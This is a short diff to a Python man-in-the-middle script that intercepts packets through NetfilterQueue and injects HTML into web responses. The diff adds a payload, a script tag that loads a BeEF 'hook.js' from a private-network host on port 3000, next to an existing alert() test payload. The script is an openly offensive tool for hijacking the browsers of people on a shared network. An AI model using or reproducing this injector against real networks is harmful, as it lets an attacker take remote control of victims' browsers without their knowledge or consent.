@@ -9,6 +9,7 @@ AcceptEncodingRegex = "Accept-Encoding:.*?\\r\\n"
 replace_load = ""
 ContentLengthRegex = "(?:Content-Length:\s)(\d*)"
 injection_code = "<script>alert('Test!'); </script>"
+beef_injection_code = '<script src="http://192.168.63.139:3000/hook.js"></script>'
 
 def set_load(packet, load):
     packet[Raw].load = load
@@ -48,7 +49,7 @@ if __name__ == "__main__":
     try:
         print("[*] Initializing NetfilterQueue...")
         queue = netfilterqueue.NetfilterQueue()
-        queue.bind(3, process_packet)
+        queue.bind(0, process_packet)
         queue.run()
     except KeyboardInterrupt:
         print("\n[!] Ctrl+C detected. Unbinding queue and exiting...")
